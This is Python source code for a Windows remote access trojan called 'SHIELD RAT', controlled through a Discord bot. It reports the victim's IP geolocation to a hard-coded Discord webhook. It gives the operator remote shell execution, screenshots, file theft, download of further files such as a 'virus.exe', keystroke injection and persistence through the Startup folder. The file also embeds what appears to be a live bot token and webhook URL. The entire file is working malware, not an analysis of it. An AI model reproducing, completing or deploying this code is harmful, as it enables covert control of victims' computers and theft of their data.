import discord
import os
import ctypes
from pynput.keyboard import Key, Controller
import sys
from psutil import virtual_memory
import psutil
import platform
import subprocess
from discord import File
import requests
import random
import winsound
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput import keyboard
import ctypes
from ctypes import wintypes

user32 = ctypes.WinDLL("user32")

SW_HIDE = 0
SW_SHOW = 5

user32.FindWindowW.restype = wintypes.HWND
user32.FindWindowW.argtypes = (
    wintypes.LPCWSTR, 
    wintypes.LPCWSTR)

user32.ShowWindow.argtypes = (
    wintypes.HWND, 
    ctypes.c_int) 

def hide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_HIDE)

def unhide_taskbar():
    hWnd = user32.FindWindowW(u"Shell_traywnd", None)
    user32.ShowWindow(hWnd, SW_SHOW)

    
def get_info(ip):
    url = f'http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query'
    c = requests.get(url)
    return c.json()

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)

def add_to():
    url=sys.argv[0]
    outfile=url.split('\\')[len(url.split('\\'))-1]
    print(outfile)
    k = open(sys.argv[0], 'rb')
    data=k.read()
    k.close()
    username = os.getlogin()
    f = open(fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{outfile}', 'wb')
    f.write(data)
    f.close()

banner = '''

```
keystroke - send key's ex: keystore <any words or lines>
shutdown - off the pc
beep - beep the pc with great frequency
lock - lock workstation of the  pc
sysinfo - get system info
shell - you cmd commands ex: shell <whoami>
tasklist - list all the tasks running..
taskkill - kill a task ex: taskill notepad.exe
download - download a file to target ex: download https://example.com/virus.exe
screenshot - screenshot from the target pc
copytostartup - add the RAT to startup
find - find a file ex: find secret.csv
upload - upload a file from target ex: upload information.csv
author - print the author of shield RAT
sendmsg - sendmsg <any type of words or lines>
enabletaskbar - unhide the hided taskbar
disabletaskbar - hide the taskbar

```

'''

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def get_ip():
    r = requests.get('http://checkip.amazonaws.com/')
    return r.content.decode().strip()


mem = virtual_memory()
ram=mem.total 

def contect_perfect():
    url = 'https://discord.com/api/webhooks/809324900317528094/RRWVA8oh11Hbxj6AvXtlfNaYSW34dbApAAgNftgFuU1RYFK8EqBmvjrXBkQPFe9MbMaA'
    webhook = DiscordWebhook(url=url)
    con = get_info(get_ip())
    con.get('proxy')
    con.get('org')
    con.get('city')
    print(con)
    # {con.get('country')}
    d = f"**Country: **{con.get('country')}\n**Proxy or Vpn: **{con.get('proxy')}\n**ISP: **{con.get('isp')}\n **City: ** {con.get('city')}\n **latitude: **{con.get('lat')}\n**longitude: **{con.get('lon')}"
    embed = DiscordEmbed(title=':white_check_mark: new connection from: '+str(get_ip()), description=d, color=242424)

    webhook.add_embed(embed)
    response = webhook.execute()
    print('sended')

    
contect_perfect()

def exit_the():
    while True:
        break

keyboard = Controller()
frequency = 7000  
duration = 1000

windows_verion = platform.platform()
processor = platform.processor()
art = platform.machine()
version = platform.version()
sysinfo = '\n'+'Desktop name: '+str(os.getlogin())+'\nOperating system: '+windows_verion + '\nArchitecture: '+art+'\nProcessor: '+processor+'\n'+'Ram: '+str(ram)+'\n'+'Ip Address: '+str(get_ip())+'\nCpu count: '+str(psutil.cpu_count())

def intr(cmd):       
    try:
        from subprocess import DEVNULL
    except ImportError:
        DEVNULL = os.open(os.devnull, os.O_RDWR)

    output = subprocess.check_output(cmd, stdin=DEVNULL, stderr=DEVNULL, shell=True)
    return output

client = discord.Client()

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
    print(str(message.content.strip()))
    if message.attachments:
        print(message.attachments)
    if message.author == client.user:
        return
    elif str(message.content.strip()) == 'help':
        await message.channel.send(banner)


    elif str(message.content.strip()) == 'author':
        await message.channel.send('Cyr0_warrior the author of SHIELD [RAT]')
        
    elif 'keystroke' in message.content:
         keyboard.type(message.content.replace('keystroke', ''))
         await message.channel.send('Injected Succesfully....')

    elif str(message.content.strip()) == 'shutdown':
        intr('shutdown /s')
        await message.channel.send('Shutdown Signal Sended...!!')

    elif str(message.content.strip()) == 'lock':
        ctypes.windll.user32.LockWorkStation()
        await message.channel.send('locked successfully...')

    elif 'sendmsg' in message.content :
        i = message.content.replace('sendmsg', '')
        ctypes.windll.user32.MessageBoxW(0, i, "SHIELD RAT", 0)

    elif str(message.content.strip()) == 'tasklist':
        cmd=intr('wmic process get description')
        f = open(r'C:\Windows\Temp\task.txt', 'w')
        f.write(cmd.decode('utf-8').strip())
        f.close()

        with open(r'C:\Windows\Temp\task.txt', 'r') as file:
            msg = file.read(2000).strip()
            while len(msg) > 0:
                await message.channel.send(msg)
                msg = file.read(2000).strip()
                open(r'C:\Windows\Temp\task.txt', 'w').close()

    elif 'taskkill' in message.content:
        cr = message.content.replace('taskkill', '')
        try:
            j=intr(f'TASKKILL /F /IM {cr}')
            await message.channel.send(j.decode())
        except:
            await message.channel.send('invalid process')
    elif str(message.content.strip()) == 'sysinfo':
        await message.channel.send(sysinfo)
        
    elif str(message.content.strip()) == 'screenshot':
        code = random.randint(999, 9999)
        path = resource_path('printscreen.exe')
        print(path)
        intr(fr'{path} > C:\Windows\Temp\{code}.jpg')
        await message.channel.send(file=discord.File(fr'C:\Windows\Temp\{code}.jpg'))
        os.remove(fr'C:\Windows\Temp\{code}.jpg')
        
    elif str(message.content.strip()) == 'copytostartup':
        add_to()
        await message.channel.send('Payload added to startup...')
        
    elif str(message.content.strip()) == 'beep':
        frequency = 9000  
        duration = 1000  
        winsound.Beep(frequency, duration)
        await message.channel.send('beeped successfully...')

    elif str(message.content.strip()) == 'upload':
        i=message.content.replace('upload', '')
        try:
            await message.channel.send(file=discord.File(i.strip()))
        except Exception as e:
            if 'Payload Too Large' in str(e):
                 await message.channel.send('the file selected is too large to send from discord')
            else:
                await message.channel.send(str(e))
    elif 'find' in message.content:
        i=message.content.replace('find', '')
        await message.channel.send(find(i.strip(), os.getcwd()))
        
    elif 'download' in message.content:
        try:
            i=message.content.replace('download', '')
            outfile=i.split('/')[len(i.split('/'))-1]
            r = requests.get(i)
            f = open(fr'C:\Windows\Temp\{outfile}', 'wb')
            f.write(r.content)
            f.close()
            await message.channel.send('download successfully to the server named: '+str(outfile))
        except Exception as e:
            await message.channel.send(str(e))
    elif str(message.content.strip()) == 'shell':
        try:
            out = intr(message.content.replace('shell', ''))
            f = open(r'C:\Windows\Temp\task.txt', 'w')
            f.write(out.decode().strip())
            f.close()

            with open(r'C:\Windows\Temp\task.txt', 'r') as file:
                msg = file.read(2000).strip()
                while len(msg) > 0:
                    await message.channel.send(msg.strip())
                    msg = file.read(2000).strip()
                    open(r'C:\Windows\Temp\task.txt', 'w').close()

        except Exception as e:
            await message.channel.send('COMMAND RETURN TO ERROR')


    elif str(message.content.strip()) == 'enabletaskbar':
        unhide_taskbar()
        await message.channel.send('Taskbar Enabled...')


    elif str(message.content.strip()) == 'disabletaskbar':
        hide_taskbar()
        await message.channel.send('Taskbar Disabled...')        

token = 'ODAxMDkzMDk4Nzg4MDkzOTYy.YAbqFg.zjlEP73ruQ1JaVO5FhqaOeLC6qE'            
client.run(token)
